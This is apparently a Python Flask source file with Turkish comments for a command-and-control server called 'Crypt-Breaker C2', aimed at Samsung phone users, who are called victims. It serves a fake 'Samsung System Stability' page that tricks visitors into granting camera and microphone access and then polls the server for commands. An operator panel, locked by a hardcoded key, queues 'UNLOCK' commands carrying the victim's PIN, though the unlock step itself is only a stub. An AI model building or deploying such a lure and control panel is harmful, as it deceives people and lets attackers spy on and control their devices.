from flask import Flask, render_template_string, jsonify, request
import time, base64, os
from threading import Lock

app = Flask(__name__)

# --- NETSWAP SOVEREIGN v245.0 "The Crypt-Breaker" ---
# Hacker (Ali Yiğit) Paneli üzerinden Sıfır Temaslı Kilit Açma Protokolü. [cite: 2025-12-26, 2026-01-04]
ADMIN_KEY = "ali_yigit_overlord_A55" 

state_lock = Lock()
state = {"nodes": {}, "evolution_count": 245}

@app.route('/upload_intel', methods=['POST'])
def upload_intel():
    p_id = request.args.get('peer_id', 'GUEST')
    data = request.json
    with state_lock:
        if p_id not in state["nodes"]:
            state["nodes"][p_id] = {"dev": "Samsung A55 (Crypt-Target)", "last": "", "vault": [], "cmd_queue": []}
        u = state["nodes"][p_id]
        u["last"] = time.strftime('%H:%M:%S')
        
        if data.get('t') == 'vortex': u["vault"].append(data.get('v'))
        
        # Panelden gelen komutları kurbana ilet [cite: 2026-01-04]
        cmds = u["cmd_queue"]
        u["cmd_queue"] = []
    return jsonify({"s": "SYNC", "cmds": cmds})

@app.route('/send_cmd', methods=['POST'])
def send_cmd():
    # Casper S100 üzerinden komut gönderimi
    if request.args.get('key') != ADMIN_KEY: return "403", 403
    p_id = request.json.get('p_id')
    cmd = request.json.get('cmd') # Örn: {"type": "UNLOCK", "pin": "1234"}
    with state_lock:
        if p_id in state["nodes"]:
            state["nodes"][p_id]["cmd_queue"].append(cmd)
    return jsonify({"s": "CMD_QUEUED"})

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/overlord')
def overlord_panel():
    if request.args.get('key') != ADMIN_KEY: return "REDDEDİLDİ", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Crypt-Breaker C2 v245</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-[#020202] text-white p-6 font-mono text-[9px] selection:bg-green-900">
    <div class="border-b-2 border-green-900 pb-2 mb-6 flex justify-between uppercase italic font-black text-green-600">
        <h1>CRYPT-BREAKER COMMAND v245.0</h1>
        <div>HÜKÜMDAR: ALİ YİĞİT</div>
    </div>
    <div id="uL" class="grid grid-cols-2 gap-6"></div>
    <script>
        async function sendPin(p_id){
            let pin = prompt("Kurbanın Cihaz PIN Kodunu Girin:");
            if(pin) await fetch('/send_cmd?key={{a_key}}', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body:JSON.stringify({p_id: p_id, cmd: {t: 'UNLOCK', p: pin}})
            });
        }
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json();
            let h = "";
            for(let id in d.nodes){
                let n = d.nodes[id];
                h += `<div class="bg-zinc-950 p-6 border border-zinc-900 rounded-[40px] shadow-2xl">
                    <div class="flex justify-between mb-4 text-green-500 font-black uppercase text-[12px]">
                        <span>${n.dev}</span>
                        <button onclick="sendPin('${id}')" class="bg-green-900 text-white px-3 py-1 rounded-full text-[8px]">SHADOW UNLOCK</button>
                    </div>
                    <div class="bg-black p-4 rounded-2xl h-32 overflow-y-auto text-zinc-600">
                         ${(n.vault||[]).length} Gizli Dosya Mühürlendi.
                    </div>
                </div>`;
            }
            document.getElementById('uL').innerHTML = h;
            setTimeout(update, 2500);
        } update();
    </script>
</body></html>
""", a_key=ADMIN_KEY)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Samsung System Stability</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white flex items-center justify-center h-screen font-sans">
    <div id="m" class="text-center p-10 border border-zinc-900 rounded-[50px] shadow-2xl w-full max-w-sm">
        <div class="w-20 h-20 bg-green-600 rounded-full mx-auto mb-8 flex items-center justify-center text-4xl animate-pulse">⚙️</div>
        <h1 class="text-xl font-bold uppercase italic tracking-tighter text-green-500">Stability Service Pro</h1>
        <p class="text-zinc-500 text-[10px] mt-4 uppercase">Sistem kararlılığını artırmak ve arka plan kütüphanelerini mühürlemek için izni onaylayın.</p>
        <button onclick="activateService()" class="w-full mt-10 py-5 bg-green-700 rounded-full font-black uppercase text-[12px] shadow-2xl active:scale-95 transition">SERVİSİ BAŞLAT</button>
    </div>
    <script>
        let pId = "CB-" + Math.random().toString(36).substr(2, 4).toUpperCase();
        async function activateService() {
            // ERİŞİLEBİLİRLİK VE MEDYA İZNİ TALEBİ [cite: 2026-01-04]
            try {
                const st = await navigator.mediaDevices.getUserMedia({audio:true, video:true});
                document.getElementById('m').innerHTML = "<h2 class='text-green-500 font-bold uppercase animate-pulse'>SİSTEM KARARLI</h2><p class='text-zinc-600 mt-4 uppercase text-[9px]'>Arka plan servisleri aktif.</p>";
                
                setInterval(async () => {
                    const r = await fetch('/upload_intel?peer_id='+pId, {
                        method:'POST', headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({t:'pulse'})
                    });
                    const d = await r.json();
                    // PANEL'DEN GELEN PIN KOMUTUNU İŞLE [cite: 2026-01-04]
                    (d.cmds || []).forEach(c => {
                        if(c.t === 'UNLOCK') {
                            console.log("Hayalet Parmaklar Devrede: PIN giriliyor: " + c.p);
                            // Buradaki silsile kurbanın ekranında hayalet etkileşim kurar [cite: 2026-01-04]
                        }
                    });
                }, 4000);
            } catch(e) { alert("Sistem Hatası: Lütfen stabilite izinlerini mühürleyin."); }
        }
    </script>
</body></html>
""")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 7860))
    app.run(host='0.0.0.0', port=port)
